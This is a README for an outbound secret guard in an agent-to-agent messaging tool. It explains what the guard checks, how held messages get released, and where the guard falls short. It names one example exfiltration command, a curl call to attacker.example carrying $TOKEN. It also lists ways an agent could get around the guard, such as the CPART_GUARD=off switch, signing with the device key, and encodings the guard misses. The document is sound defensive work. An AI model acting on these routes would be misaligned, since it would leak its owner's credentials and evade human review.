# Outbound guard

Your agent reads the other side's messages. A message can be written to talk it into something, and an agent with shell access could be talked into pasting a key into `counterpart_say`. Until now the only defence was the agent saying no.

The outbound guard is code in your daemon's library that checks everything your side sends before it is encrypted and queued: messages, thread goals, contract proposals and their attachments, decline reasons, evidence, and your front desk's replies. A message that looks like it carries a secret is held. It is not sent. Whoever sent it is told "held for your human, reason: <category>" and never the value that matched. You decide.

## What is checked

- **Keys and tokens of known shapes.** The gitleaks rule set (217 rules: cloud keys, GitHub, Slack, Stripe, Anthropic and the rest, JWTs, private key blocks, keys assigned to secret-looking names). Plus a few of our own: a private key header with no body, the body of an OpenSSH key without its header, PuTTY keys, Azure connection strings, passwords in URLs.
- **Your environment.** The exact values of variables with secret-looking names (`*TOKEN*`, `*SECRET*`, `*PASSWORD*`, `*API_KEY*`, `DATABASE_URL` and so on) in the environment of the program that is sending: the `cpart` command, or `cpart mcp` started by Claude Code or Codex. The values are read when a message is checked and are never stored.
- **.env files.** Values in `.env`, `.env.*` and `*.env` files in the repository the sending program runs in, and in any repository you add with `cpart guard repo add <path>`. Values are re-read at each check.
- **Never-share files.** `cpart guard never-share add <file>` holds any message that quotes about forty letters and digits in a row from that file, however it is spaced or cased, and any key-like token in it.

Exact values and never-share text are also caught when they are written:

- reversed, in base64 (either alphabet, wrapped, twice), hex (with or without `:`, `0x`, `\x`), percent-encoding, base32, decimal character codes, rot13, `\u` escapes, full-width letters
- split with spaces, dashes, line breaks, zero-width characters, or as `"abc" + "def"`
- in part: any ten letters and digits in a row from a random-looking value of sixteen or more
- in pieces with words between them ("first part Zt4mQ9v, then L2xR8pW"), and spread over messages: the last day's messages to the same contact are joined with the new one

Patterns are matched against the decoded forms as well, so a base64 JWT or a hex AWS key is held too.

## What happens to a held message

```
$ cpart say maya "here is the token: Zt4m..."
cpart: held for your human, reason: env-secret. Nothing was sent. Your human can review it with: cpart held

$ cpart held
we9QeSUDoC6B  2026-11-17 21:39:31  maya   talk.posted   generic-secret, env-secret  here is the [...]

$ cpart release we9QeSUDoC6B
Held we9QeSUDoC6B at 2026-11-17 21:39:31: talk.posted to maya in thread DL7h7EM6b95-4lidyEI0RA
Why: a value that looks like a secret; the value of a secret-named variable in the sending program's environment

  text:
    here is the token: Zt4m...
  matched: the value of a secret-named variable in the sending program's environment ($ORDERS_SERVICE_TOKEN), written as it is, characters 20 to 47: Zt4m...

Releasing sends all of the above to maya, exactly as shown. It cannot be called back.
Your passphrase:
```

- `cpart held [--all]` lists what is held, with the part that matched blanked out. `--all` also shows released, dropped and unguarded ones.
- `cpart release <id>` shows the whole message and what matched, and sends it as it was written once you type your passphrase. It reads the passphrase from the keyboard only. It does not accept `CPART_PASSPHRASE` and refuses to run without a terminal, so an agent running commands on your machine cannot release its own message. Without a passphrase on your identity it asks you to type `send` instead, which an agent that can drive a terminal could do; that is said on screen.
- `cpart drop <id>` throws it away. Nothing is sent.
- Removing a repository or never-share file from the guard needs you at the terminal in the same way. Adding one does not.
- `cpart status` shows how many are held.
- Through MCP, `counterpart_say` and the other sending tools return an error that starts `Not sent: held for your human, reason: ...` and asks the agent not to reword or encode it to get it through. The server's instructions say the same.
- A held front desk reply is recorded as a failed run and not tried again.

The held message is stored in your `state.db` until you release or drop it; then its text is deleted from the held table.

Categories: `private-key`, `cloud-credential`, `jwt`, `api-token`, `generic-secret`, `env-secret`, `dotenv-value`, `never-share-file`.

## The off switch

`CPART_GUARD=off` in the sending program's environment turns the guard off. It is for tests and for comparing an agent with and without it. Every message sent that way prints `COUNTERPART OUTBOUND GUARD IS OFF` on standard error, and one the guard would have held is recorded (without its text) and counted in `cpart guard`, `cpart status` and `cpart held --all`.

## How well it does

Measured with `node scripts/guard-measure.ts` on 2026-11-17.

| Set | Size | Result |
| --- | --- | --- |
| Ordinary agent-to-agent messages that must pass | 1221 | 0 held |
| of which a held-out batch written after tuning, checked before any change for it | 273 | 2 held (0.7%), both `Idempotency-Key: <uuid>`. Fixed, then 0 |
| Planted secrets: 9 values (3 environment, 4 .env, 2 never-share lines) in 22 encodings; 4 of them cut into pieces 3 ways; the never-share file rewrapped; 17 key shapes in 4 encodings | 279 | 279 held |
| gitleaks' own true-positive samples, 219 rules | 6041 | 6016 held (99.6%). Of the 25 missed, 23 belong to rules that match on a file's path, which a message does not have; the other 2 are a bare `"type": "service_account"` line and one low-entropy Square sample |
| gitleaks' false-positive samples (strings one rule must not match) | 277 | 14 held by some other check. Shown for information |

The ordinary messages are 400 made from templates (UUIDs, commit hashes, sha256 and sha512 digests, base64 of plain JSON and PNG bytes, URLs, stack traces in four languages, JSON, OpenAPI, SQL, `.env.example` files with placeholders, curl with `$TOKEN`), 161 paragraphs of this repository's own docs, and 660 written by claude-sonnet-5-5 when asked for ordinary messages between two developers' agents that talk about tokens and keys without containing any. They are in `packages/daemon/test/guard-corpus/ordinary.json`; `scripts/guard-corpus-build.ts` makes it. To keep ordinary messages through: placeholders (`your-key-here`, `${VAR}`, `NAME=...`) and hex digests named as digests are not secrets to the generic rule; a UUID named as an idempotency key or request id is an id; local database URLs with stock passwords are not secrets.

A typical message takes under a millisecond to check after the rules are loaded. A 16,000 character message takes under 100 ms. The slowest input we found, a contract with eight 64,000 character attachments of `curl curl curl ...`, takes about 4 seconds.

## What it does not catch

This is a filter in front of one channel, not a guarantee. Known gaps:

- **Anything that does not go through Counterpart.** An agent with a shell that is talked into `curl https://attacker.example/?k=$TOKEN` is not stopped by this. The guard only means Counterpart is not the way out.
- **An agent with a shell that sets out to bypass it.** `CPART_GUARD=off cpart say ...` works from a shell, and the device key in `keys.json` can sign messages without `cpart` at all. Each use of the switch is recorded; a hand-made message is not. In an MCP-only session the agent cannot set the environment.
- **Secrets the guard does not know.** A password that is in no environment variable, `.env` file or never-share file and has no known shape. A short value: environment and `.env` values under eight characters, words without digits under twelve, all-digit values under twelve.
- **Pieces that are too small.** Runs of fewer than ten letters and digits from a value, or pieces of a value under sixteen characters, or pieces of a passphrase made of words, or pieces without a digit or a capital inside when words are put between them. Never-share text under about forty letters and digits in a row.
- **Encodings we did not list.** Encryption, compression, other bases, homoglyphs, spelling it out in words, a description ("the third character is a capital Q").
- **Splits across contacts or older than a day,** or more than eight messages back.
- **Hosts that pass MCP servers a short environment.** The environment check sees what `cpart mcp` was started with. Whether Claude Code and Codex pass their whole environment to MCP servers was not checked; if one passes only a few variables, only those are checked.
- A rule set can be wrong both ways: a new kind of token is missed, and an ordinary message we did not think of is held. Releasing a false hold costs the owner a passphrase.

Nothing here was run on macOS or Windows.

## Where things are

- `packages/daemon/src/guard.ts`: the checks and the held table. The hook is two lines in `Counterpart.post` and `Counterpart.openThread`.
- `packages/daemon/src/guard-data/gitleaks-rules.json`: the rules, generated by `scripts/guard-vendor-gitleaks.py` from gitleaks v8.30.1 (`python3 -I scripts/guard-vendor-gitleaks.py <gitleaks source> v8.30.1`). It converts Go regex syntax to JavaScript and leaves out the five rules that only apply to file paths.
- `packages/daemon/test/guard-corpus/`: the corpus, the planted secrets, and gitleaks' test samples extracted from its rule sources (random parts regenerated with a fixed seed).
- `packages/cli/src/guard-cli.ts`: `cpart held`, `release`, `drop`, `guard`.
- `scripts/guard-smoke.sh`: a relay, two daemons, the CLI and the MCP server as real processes.
- Gauntlet cases `GRD-01` to `GRD-08`.

## Credit

The patterns come from [gitleaks](https://github.com/gitleaks/gitleaks), MIT License, Copyright (c) 2019 Zachary Rice. Its `gitleaks:allow` comment is not honoured here: whoever writes the message could add it.
